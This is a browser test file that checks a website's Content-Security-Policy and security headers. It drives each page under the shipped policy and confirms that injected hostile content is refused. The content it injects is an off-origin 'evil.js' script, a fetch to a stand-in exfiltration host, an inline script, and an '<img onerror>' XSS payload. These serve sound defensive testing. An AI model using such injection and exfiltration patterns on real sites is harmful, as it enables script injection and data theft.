/* test_csp.mjs — the security headers we SHIP, exercised by the browser that has to obey them.
 *
 * `sim/web/_headers` is only ever sent by Cloudflare Pages, and a CSP that refuses a page's
 * own script does not degrade — it blanks the page in production. So this parses the REAL
 * `_headers` (never a restated copy), serves every page with it, and DRIVES each page (search,
 * typed turn, QR) with a `securitypolicyviolation` listener installed before any page script
 * runs. With TEETH: off-origin and inline scripts injected into the page must be REFUSED, so
 * green cannot mean "no policy arrived". The hash arithmetic is sim/tests/test_csp_hashes.py's;
 * here sim.html booting at all (its importmap is the hashed block) is the in-browser proof.
 *
 *   node sim/test_csp.mjs
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { requireBrowser, serveWeb, serveStatic, pagesHeaders, makeChecks, finish, web, launchBrowser,
         recordCspViolations } from "./browser_harness.mjs";

const LABEL = "CSP + security-headers test";
const { puppeteer, chrome } = await requireBrowser(LABEL);
const { fails, ok, eq, count } = makeChecks();
const deep = (a, b, m) => eq(JSON.stringify(a), JSON.stringify(b), m);

/** Turnstile's widget host, named ONCE. The allowance is this host exactly: a bare
 *  `cloudflare.com` is a DIFFERENT host and is still refused. */
const TURNSTILE = "https://challenges.cloudflare.com";

const site = await serveWeb({ headers: true });
const H = pagesHeaders();
const CSP = H["Content-Security-Policy"] || "";
/** One directive of the shipped CSP, e.g. `directive("script-src")` → "script-src 'self' …". */
const directive = (name) => (CSP.split(";").find((d) => d.trim().startsWith(name)) || "").trim();
const sources = (name) => directive(name).split(/\s+/).slice(1);

/* Served under a NON-local hostname mapped to loopback — the configuration Pages ships into.
 * On a local host env.js also probes the :8081/:8082 sidecars, a dev-only refusal. */
const HOST = `http://moxie.hosted.test:${site.port}`;
const browser = await launchBrowser(puppeteer, chrome, { hosts: { "moxie.hosted.test": site.port } });

/** What the real `static.cloudflareinsights.com` sends, and what a module fetch needs. */
const CORS = { "Access-Control-Allow-Origin": "*" };
const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
/** Console lines that are a POLICY refusal. */
const cspErrors = (errs) => errs.filter((e) => POLICY_LINE.test(e));

/* WAITING: every injection resolves on the browser's own `load`/`error`/violation event.
 * `CEILING` only stops a hung renderer from hanging the suite; an expiry yields a SENTENCE
 * naming what never arrived, never comparable to "loaded", "refused" or `null`. */
const CEILING = 30000;
/** Poll a NODE-side predicate (puppeteer's console arrays live in this process). */
const until = async (pred, ms = CEILING, step = 50) => {
  const t0 = Date.now();
  for (;;) {
    if (pred()) return true;
    if (Date.now() - t0 >= ms) return false;
    await new Promise((r) => setTimeout(r, step));
  }
};
/** Poll an IN-PAGE predicate; its first truthy value, or `null` on expiry (never throws). */
const untilPage = async (page, fn, arg = null, ms = CEILING) => {
  try { return await (await page.waitForFunction(fn, { polling: 100, timeout: ms }, arg)).jsonValue(); }
  catch { return null; }
};

let injectN = 0;
/** Add a `<script src>` the way Pages injects the beacon and report what the BROWSER decided:
 *  "loaded" (`load` fires only after evaluation) or "refused" (`error`). `module: true` mirrors
 *  Pages' `type="module" crossorigin="anonymous"` tag (hence CORS in the interceptors). */
const injectTag = async (page, src, { module = false } = {}) => {
  const tag = `i${++injectN}`;
  await page.evaluate((u, t, mod) => {
    (window.__inject = window.__inject || {})[t] = null;
    const s = document.createElement("script");
    if (mod) s.type = "module";
    s.src = u;
    s.onload = () => { window.__inject[t] = "loaded"; };
    s.onerror = () => { window.__inject[t] = "refused"; };
    document.head.appendChild(s);
  }, src, tag, module);
  return (await untilPage(page, (t) => window.__inject[t] || null, tag)) ||
    `GAVE UP: <script src="${src}"> fired NEITHER load NOR error within ${CEILING} ms — ` +
    "a starved renderer, NOT a policy verdict";
};
/** Opaque dark pixels on a canvas: an untouched canvas is rgba(0,0,0,0), not ink. */
const inkOf = (page, id) => page.evaluate((i) => {
  const c = document.getElementById(i);
  const d = c.getContext("2d").getImageData(0, 0, c.width, c.height).data;
  let dark = 0;
  for (let k = 0; k < d.length; k += 4) if (d[k + 3] > 0 && d[k] < 128) dark++;
  return dark;
}, id);
const show = (vs) => vs.map((v) => `${v.directive} ⟵ ${v.blocked}${v.sample ? " «" + v.sample + "»" : ""}`).join(" | ");

/** A page under the shipped headers, with violation EVENTS recorded from document start. */
async function load(path, { intercept } = {}) {
  const page = await browser.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  await page.evaluateOnNewDocument(recordCspViolations);
  const errs = [], notFound = [];
  page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
  page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
  page.on("response", (r) => { if (r.status() === 404) notFound.push(r.url()); });
  if (intercept) {
    await page.setRequestInterception(true);
    page.on("request", (r) => { if (!r.isInterceptResolutionHandled() && !intercept(r, r.url())) r.continue(); });
  }
  const res = await page.goto(`${HOST}/${path}`, { waitUntil: "load", timeout: 30000 });
  return { page, errs, notFound, headers: res.headers() };
}

/** Everything a page said, at the END of driving it: zero violation events, zero policy lines,
 *  and no other console error but the `/api/health` 404s (the static server has no Functions),
 *  forgiven one-for-one against observed 404 responses. */
async function clean(path, { page, errs, notFound }) {
  const v = await page.evaluate(() => window.__csp || []);
  eq(v.length, 0, `${path}: ZERO securitypolicyviolation events — ${show(v)}`);
  eq(cspErrors(errs).length, 0, `${path}: NOTHING refused by the policy — ${cspErrors(errs).slice(0, 3).join(" | ")}`);
  let budget = notFound.every((u) => /\/api\/health\b/.test(u)) ? notFound.length : 0;
  const other = errs.filter((e) => {
    if (POLICY_LINE.test(e)) return false;
    if (budget > 0 && /status of 404/.test(e)) { budget--; return false; }
    return true;
  });
  eq(other.length, 0, `${path}: no other console errors — ${other.slice(0, 3).join(" | ")}`);
}

try {
  /* =====================================================================
   * 1. The policy itself — read off the file we ship. Exhaustive lists: a widening is a diff.
   * =================================================================== */
  deep(sources("connect-src"), ["'self'", TURNSTILE],
       "connect-src is 'self' plus EXACTLY the Turnstile host — nothing else may exfiltrate " +
       "(the beacon reports to a SAME-ORIGIN /cdn-cgi/rum)");
  const scriptSrc = sources("script-src");
  eq(scriptSrc[0], "'self'", "script-src is pinned to 'self'");
  deep(scriptSrc.filter((t) => /:/.test(t) && !/^'/.test(t)), ["https://static.cloudflareinsights.com", TURNSTILE],
       "script-src names EXACTLY two off-origin hosts: Pages' injected beacon and Turnstile's api.js");
  /* Only 'self' and SHA-256 hashes may be quoted: 'unsafe-inline'/'unsafe-hashes'/'unsafe-eval'
   * reopen the door, `'strict-dynamic'` would void the host allowance. */
  deep(scriptSrc.filter((t) => t.startsWith("'") && t !== "'self'" && !/^'sha256-[A-Za-z0-9+/]+={0,2}'$/.test(t)), [],
       "script-src's quoted sources are 'self' + sha256 hashes only");
  deep(sources("frame-src"), [TURNSTILE], "frame-src is EXACTLY the Turnstile host (with 'none' it mints no token)");
  for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
    ok(CSP.includes(d), `_headers must carry ${d}`);
  ok(/max-age=\d{7,}/.test(H["Strict-Transport-Security"] || ""), "HSTS is set with a real max-age");
  eq(H["X-Content-Type-Options"], "nosniff", "nosniff is still there");
  /* App-script SUBDIRECTORIES are no-cache by one directory rule each, so a new module file
   * cannot be forgotten (the flat per-file list is sim/tests/edge/turnstile/05's). */
  const headerText = readFileSync(join(web, "_headers"), "utf8");
  for (const dir of readdirSync(web, { withFileTypes: true })) {
    if (!dir.isDirectory() || dir.name === "vendor") continue;
    const js = readdirSync(join(web, dir.name)).filter((f) => f.endsWith(".js"));
    if (js.length) ok(new RegExp(`^/${dir.name}/\\*\\n\\s+Cache-Control:\\s*no-cache$`, "m").test(headerText),
                      `sim/web/${dir.name}/ ships ${js.length} scripts and has a /${dir.name}/* no-cache rule`);
  }

  /* =====================================================================
   * 2. EVERY PAGE WORKS under the policy — driven, not merely rendered (a page whose glue
   *    failed still paints its markup), then held to zero violations and a clean console.
   * =================================================================== */
  /* --- sim.html: the module graph, lazy mqtt, a typed turn, the QR card, then TEETH ------ */
  {
    const P = await load("sim.html");
    const { page, errs, headers } = P;
    ok((headers["content-security-policy"] || "").includes("script-src") &&
       (headers["strict-transport-security"] || "").includes("max-age"),
       "sim.html: the browser really received the policy and HSTS");
    /* `window.moxie` exists only if the module graph resolved through the HASHED importmap and
     * three.js loaded from ./vendor — the most CSP-fragile thing on the site. */
    ok(await untilPage(page, () => !!(window.moxie && window.moxieBridge && window.moxieAudio &&
       window.moxieMode && window.moxieTypedTurn && window.moxieStub)),
       "sim.html: its scripts ran under the policy (the hashed importmap was admitted)");
    /* mqtt.js is fetched lazily by the first Link, so a visit that never links never pays for
     * it — and when it IS fetched, 'self' must admit it. */
    const lazy = await page.evaluate(async () => {
      const before = typeof mqtt === "undefined" &&
        !performance.getEntriesByType("resource").some((e) => /mqtt\.min\.js/.test(e.name));
      const loaded = await window.moxieBridge.loadMqtt();
      return { before, loaded, after: typeof mqtt !== "undefined" && typeof mqtt.connect === "function" };
    });
    ok(lazy.before && lazy.loaded && lazy.after,
       `sim.html: mqtt.js is not fetched on a plain visit, and loadMqtt() fetches it under the CSP (${JSON.stringify(lazy)})`);
    await page.type("#speech-input", "hello moxie");
    await page.click("#speech-btn");
    await untilPage(page, () => document.querySelectorAll("#transcript .turn.moxie").length > 0 || null);
    const t = await page.evaluate(() => (document.getElementById("transcript") || {}).textContent || "");
    ok(/hello moxie/.test(t) && /Moxie/.test(t),
       `sim.html: a typed turn reaches the transcript AND is answered (got ${JSON.stringify(t.slice(0, 90))})`);
    await page.click("#qr-make");
    await untilPage(page, () => /\{/.test((document.getElementById("qr-status") || {}).textContent || "") || null);
    ok(await inkOf(page, "qr-canvas") > 500, "sim.html: the QR card actually drew a code");
    await clean("sim.html", P);

    /* TEETH — the policy is in force and refuses what it should. */
    const before = cspErrors(errs).length;
    eq(await injectTag(page, "https://cdn.invalid.test/evil.js"), "refused",
       "teeth: a script from another origin is REFUSED — without script-src it would have run");
    eq(await page.evaluate(() => fetch("https://exfil.invalid.test/x", { mode: "cors" })
         .then(() => "sent").catch(() => "blocked")), "blocked", "teeth: connect-src refuses an off-origin request");
    eq(await page.evaluate(() => {
      const s = document.createElement("script");
      s.textContent = "window.__inlineRan = 'ran';";
      document.head.appendChild(s);
      return window.__inlineRan || null;
    }), null, "teeth: an injected inline <script> does NOT execute — with 'unsafe-inline' it would have");
    /* The route an XSS payload actually takes: `<img onerror>` via innerHTML. The handler's
     * absence is only evidence once `error` was dispatched, so an `addEventListener` witness
     * (not policed by script-src) is the barrier. */
    await page.evaluate(() => {
      window.__handlerRan = null; window.__imgErrored = null;
      const d = document.createElement("div");
      d.innerHTML = '<img src="data:," onerror="window.__handlerRan = \'ran\'">';
      d.querySelector("img").addEventListener("error", () => { window.__imgErrored = "fired"; });
      document.body.appendChild(d);
    });
    const fired = (await untilPage(page, () => window.__imgErrored || null))
      ? await page.evaluate(() => window.__handlerRan || null)
      : `GAVE UP: the <img>'s error event never fired within ${CEILING} ms — NOT evidence the policy held`;
    eq(fired, null, "teeth: an injected inline event-handler attribute does NOT fire either");
    await until(() => cspErrors(errs).length >= before + 2);
    ok(cspErrors(errs).length >= before + 2, "teeth: …and the browser logged the refusals");
    await page.close();
  }

  /* --- docs.html: the hero decodes, search filters, a hit opens highlighted -------------- */
  {
    const P = await load("docs.html");
    const { page } = P;
    ok(await untilPage(page, () => document.querySelectorAll("#tree a").length > 0 || null),
       "docs.html: docs.js ran under the policy and built the tree");
    /* The README hero as PIXELS (a refusal still yields an `<img>`); `complete` flips on load
     * AND error, `naturalWidth > 0` separates the two. */
    const hero = await untilPage(page, () => {
      const i = document.querySelector("article img");
      return i && i.complete ? { src: i.getAttribute("src"), w: i.naturalWidth } : null;
    });
    ok(hero && hero.w > 0 && /^img\//.test(hero.src || ""),
       `docs.html: the README hero DECODED, from this origin (${JSON.stringify(hero)})`);
    // The ~3 MB search corpus loads on the first keystroke; filtered (fewer) and not empty.
    const allDocs = await page.evaluate(() => document.querySelectorAll("#tree a").length);
    await page.type("#q", "projectorfanpid");        // a body-only term: search must have run
    const hits = await untilPage(page, (n) => { const k = document.querySelectorAll("#tree a").length;
      return k > 0 && k < n ? k : null; }, allDocs, 60000);
    ok(hits > 0, `docs.html: full-text search filters the tree (got ${hits} hits)`);
    await page.evaluate(() => { const a = document.querySelector("#tree a"); if (a) a.click(); });
    ok(await untilPage(page, () => document.querySelectorAll("article mark").length > 0 &&
         (document.querySelector("article") || { textContent: "" }).textContent.length > 2000 || null),
       "docs.html: the hit opens as rendered Markdown with the term highlighted");
    await clean("docs.html", P);
    await page.close();
  }

  /* --- setup.html: encode a Wi-Fi code; cloud.html + index.html: their glue ran --------- */
  {
    const P = await load("setup.html");
    await P.page.type("#ssid", "TestNet");
    await P.page.click("#go-wifi");
    const payload = await untilPage(P.page, () => (document.getElementById("pl-wifi") || {}).textContent || null);
    ok(/"ssid":\s*"TestNet"/.test(payload || ""), `setup.html: the Wi-Fi code encodes the typed SSID (${(payload || "").slice(0, 50)})`);
    ok(await inkOf(P.page, "cv-wifi") > 500, "setup.html: …and the QR drew");
    await clean("setup.html", P);
    await P.page.close();
  }
  {
    const P = await load("cloud.html");
    const c = await untilPage(P.page, () => {
      const tabs = document.querySelectorAll(".tab").length;
      const body = (document.querySelector("[data-panel]") || { textContent: "" }).textContent.length;
      return tabs === 5 && body > 100 ? { tabs, body } : null;
    });
    ok(c, "cloud.html: the console built its five tabs from the fixture and rendered a panel");
    await clean("cloud.html", P);
    await P.page.close();

    const I = await load("index.html");
    // Only home.js builds the sparkles: a direct witness that it ran.
    ok(await untilPage(I.page, () => document.querySelectorAll("#bg .spark").length || null),
       "index.html: home.js ran — it built the sparkles");
    await clean("index.html", I);
    await I.page.close();
  }

  /* =====================================================================
   * 3. THE TWO OFF-ORIGIN SCRIPT HOSTS — allowed by name, and by name ONLY. The Pages beacon
   *    and Turnstile's api.js RUN; one label away (bare cloudflareinsights.com / cloudflare.com)
   *    is REFUSED. Answered at the browser: a CSP refusal happens before the request, so
   *    reaching the interceptor means permitted.
   * =================================================================== */
  {
    const js = (r, body) => (r.respond({ status: 200, contentType: "text/javascript", headers: CORS, body }), true);
    const P = await load("sim.html", { intercept: (r, u) =>
      /^https:\/\/static\.cloudflareinsights\.com\//.test(u) ? js(r, "window.__beacon = 'ran';")
      : /^https:\/\/cloudflareinsights\.com\//.test(u) ? js(r, "window.__sibling = 'ran';")
      : /^https:\/\/challenges\.cloudflare\.com\//.test(u) ? js(r, "window.__turnstileHost = 'ran';")
      : /^https:\/\/cloudflare\.com\//.test(u) ? js(r, "window.__bareCloudflare = 'ran';")
      : false });
    const { page, errs } = P;
    await untilPage(page, () => !!window.moxie || null);   // inject once the page's own graph resolved

    /* `X === "refused" ? ran : X` anchors each absence to the browser's decision: a global that
     * is null merely because the script has not run YET proves nothing. */
    for (const [host, allowed, flag] of [
      ["https://static.cloudflareinsights.com/beacon.min.js/vTESTONLY", true, "__beacon"],
      ["https://cloudflareinsights.com/beacon.min.js/vTESTONLY", false, "__sibling"],
      [`${TURNSTILE}/turnstile/v0/api.js?render=explicit`, true, "__turnstileHost"],
      ["https://cloudflare.com/turnstile/v0/api.js", false, "__bareCloudflare"],
    ]) {
      const verdict = await injectTag(page, host, { module: /insights/.test(host) });
      const ran = await page.evaluate((f) => window[f] || null, flag);
      if (allowed) ok(verdict === "loaded" && ran === "ran", `${host} LOADS and executes (${verdict}/${ran})`);
      else eq(verdict === "refused" ? ran : verdict, null, `${host} is REFUSED and never runs — the allowance is host-exact`);
    }
    const logged = () => cspErrors(errs).some((e) => /'https:\/\/cloudflareinsights\.com\//.test(e));
    await until(logged);
    ok(logged(), "…with the bare host's refusal logged, so the policy really is the one in force");

    /* The beacon reports via `sendBeacon` to the RELATIVE `/cdn-cgi/rum`, so connect-src 'self'
     * covers it; an off-origin report is still refused (asserted with fetch: Chrome's sendBeacon
     * returns true before the policy check resolves). The widget's own origin is allowed. */
    eq(await page.evaluate(() => navigator.sendBeacon("/cdn-cgi/rum?test", "x")), true,
       "the beacon's SAME-ORIGIN report path is permitted");
    const fetchTo = (u) => page.evaluate((x) => fetch(x, { mode: "cors", method: "POST", body: "x" })
      .then(() => "sent").catch(() => "blocked"), u);
    eq(await fetchTo("https://cloudflareinsights.com/cdn-cgi/rum"), "blocked", "…an off-origin report is refused");
    eq(await fetchTo(`${TURNSTILE}/turnstile/v0/ping`), "sent", "connect-src PERMITS the widget's own origin");

    /* The iframe half: `frame-src` refusals never fire `onerror`, so the witness is the violation
     * EVENT, anchored to a barrier (the REQUIRED refusal observed) before asking whether the
     * ALLOWED host is absent. */
    await page.evaluate((a, b) => {
      for (const u of [a, b]) {
        const f = document.createElement("iframe");
        f.src = u; f.style.display = "none"; document.body.appendChild(f);
      }
    }, `${TURNSTILE}/cdn-cgi/challenge-platform/`, "https://cloudflare.com/frame");
    const framed = await untilPage(page, () => (window.__csp || []).some((x) => /frame/.test(x.directive || "") &&
      /^https:\/\/cloudflare\.com/.test(x.blocked || "")) ? window.__csp : null);
    if (framed) await new Promise((r) => setTimeout(r, 400));   // margin: the allowed frame was appended FIRST
    const fv = framed ? (await page.evaluate(() => window.__csp)).filter((x) => /frame/.test(x.directive || "")) : null;
    ok(fv && !fv.some((x) => /challenges\.cloudflare\.com/.test(x.blocked || "")) &&
       fv.some((x) => /^https:\/\/cloudflare\.com/.test(x.blocked || "")),
       `frame-src PERMITS the Turnstile iframe and REFUSES the bare cloudflare.com (${fv ? JSON.stringify(fv) : "GAVE UP: no frame-src violation arrived"})`);
    await page.close();
  }

  /* =====================================================================
   * 4. `style-src` — THE LAST HOLE, AND THE MEASURED REASON IT IS STILL OPEN.
   * The strict candidate is DERIVED from the shipped policy (the keyword deleted, nothing
   * retyped), served on docs.html — the one page whose blocker is not ours to delete.
   * =================================================================== */
  {
    const styleSrc = directive("style-src");
    deep(sources("style-src"), ["'self'", "'unsafe-inline'"], "style-src is 'self' plus 'unsafe-inline' and nothing else");
    const STRICT = CSP.replace(styleSrc, "style-src 'self'");
    ok(STRICT.includes("style-src 'self';") && !/style-src[^;]*unsafe-inline/.test(STRICT),
       `the derived strict policy is malformed: ${JSON.stringify(STRICT)}`);

    const strictSite = await serveStatic(web, { headers: { ...H, "Content-Security-Policy": STRICT } });
    try {
      const sp = await browser.newPage();
      await sp.setViewport({ width: 1440, height: 900 });
      await sp.goto(`${strictSite.url}/docs.html`, { waitUntil: "load", timeout: 20000 });
      await untilPage(sp, () => typeof mermaid !== "undefined" || null);
      const m = await sp.evaluate(async () => {
        const v = [];
        document.addEventListener("securitypolicyviolation", (e) =>
          v.push({ d: e.effectiveDirective || e.violatedDirective, u: e.blockedURI }));
        // Only style refusals: the page also probes the :8081 sidecar, which connect-src refuses.
        const styleV = () => v.filter((x) => /style-src/.test(x.d || "")).length;
        const settle = (ms) => new Promise((r) => setTimeout(r, ms));
        /* Quiesce first: docs.js may still be rendering mermaid, whose refusals would be charged
         * to the next probe. Wait for 250 ms with no NEW style-src refusal. */
        let last = -1, stable = 0;
        for (let i = 0; i < 400 && stable < 5; i++) {
          await settle(50);
          if (styleV() === last) stable++; else { stable = 0; last = styleV(); }
        }
        /* (a) CSSOM writes (`el.style.transform = …`) are not policed by style-src, which governs
         * <style>, <link rel=stylesheet> and the `style` ATTRIBUTE only. */
        const box = document.createElement("div");
        document.body.appendChild(box);
        const a0 = styleV();
        await new Promise((res) => {
          let n = 0;
          const frame = () => {
            box.style.transform = "translateX(" + (n % 40) + "px) rotate(" + n + "deg)";
            box.style.opacity = "0.6";
            box.style.setProperty("--csp-probe", n + "px");
            if (++n < 20) requestAnimationFrame(frame); else res();
          };
          requestAnimationFrame(frame);
        });
        const cs = getComputedStyle(box);
        const cssom = { violations: styleV() - a0, transform: cs.transform, opacity: cs.opacity,
                        custom: cs.getPropertyValue("--csp-probe").trim() };
        /* (b) NEGATIVE CONTROL — the three shapes style-src polices must all be REFUSED. */
        const b0 = styleV();
        const st = document.createElement("style");
        st.textContent = "#csp-neg{outline:9px solid rgb(0,255,0)}";
        document.head.appendChild(st);
        const neg = document.createElement("div");
        neg.id = "csp-neg";
        neg.innerHTML = '<span id="csp-neg-attr" style="color:rgb(1,2,3)">x</span>';
        document.body.appendChild(neg);
        neg.setAttribute("style", "color:rgb(4,5,6)");
        await settle(200);
        const refused = {
          violations: styleV() - b0,
          directives: v.filter((x) => /style-src/.test(x.d || "")).map((x) => x.d),
          outline: getComputedStyle(neg).outlineStyle,
          attrColor: getComputedStyle(document.getElementById("csp-neg-attr")).color,
          setColor: getComputedStyle(neg).color,
        };
        /* (c) THE ACTUAL BLOCKER: mermaid emits a runtime <style> and `style=` attributes per
         * diagram, assigned via innerHTML — no hash can cover per-diagram bytes. */
        const c0 = styleV();
        let mm;
        try {
          const r = await mermaid.render("csp_style_probe", "graph TD; A[alpha]-->B[beta];");
          const host = document.createElement("div");
          host.innerHTML = r.svg;
          document.body.appendChild(host);
          await settle(200);
          mm = { violations: styleV() - c0, styled: host.querySelectorAll("style, [style]").length };
        } catch (e) { mm = { error: String((e && e.message) || e) }; }
        return { cssom, refused, mermaid: mm };
      });

      eq(m.cssom.violations, 0, "MEASURED: rAF-driven `el.style.*` and `setProperty` fire ZERO style-src " +
         `violations under 'self' — the CSSOM is not what keeps 'unsafe-inline' (${JSON.stringify(m.cssom)})`);
      ok(/matrix\(/.test(m.cssom.transform) && m.cssom.opacity === "0.6" && m.cssom.custom !== "",
         `…and the transform, opacity and custom property all still APPLIED (${JSON.stringify(m.cssom)})`);
      ok(m.refused.violations >= 3 && m.refused.directives.some((d) => /style-src-elem/.test(d)) &&
         m.refused.directives.some((d) => /style-src-attr/.test(d)),
         "NEGATIVE CONTROL: a strict style-src REFUSES an injected <style> (style-src-elem), an innerHTML " +
         `style= and setAttribute("style") (style-src-attr) — ${JSON.stringify(m.refused)}`);
      ok(m.refused.outline === "none" && m.refused.attrColor !== "rgb(1, 2, 3)" && m.refused.setColor !== "rgb(4, 5, 6)",
         `…and none of the three took effect (${JSON.stringify(m.refused)})`);
      /* THE INVERTING GUARD — the one assertion that WANTS a violation. The day mermaid stops
       * emitting runtime styles this reddens: drop 'unsafe-inline' from style-src in
       * sim/web/_headers and delete this check. */
      ok(!m.mermaid.error && m.mermaid.styled > 0 && m.mermaid.violations > 0,
         "THE BLOCKER, STILL REAL: mermaid's generated SVG carries runtime styles a strict style-src " +
         `refuses (${JSON.stringify(m.mermaid)}). IF THIS EVER READS ZERO, the last hole can close.`);
      await sp.close();
    } finally { strictSite.close(); }
  }
} catch (e) {
  fails.push("threw: " + (e && e.stack ? e.stack.split("\n").slice(0, 4).join(" / ") : e));
} finally {
  await browser.close().catch(() => {});
  site.close();
}

finish(LABEL, { fails, count });
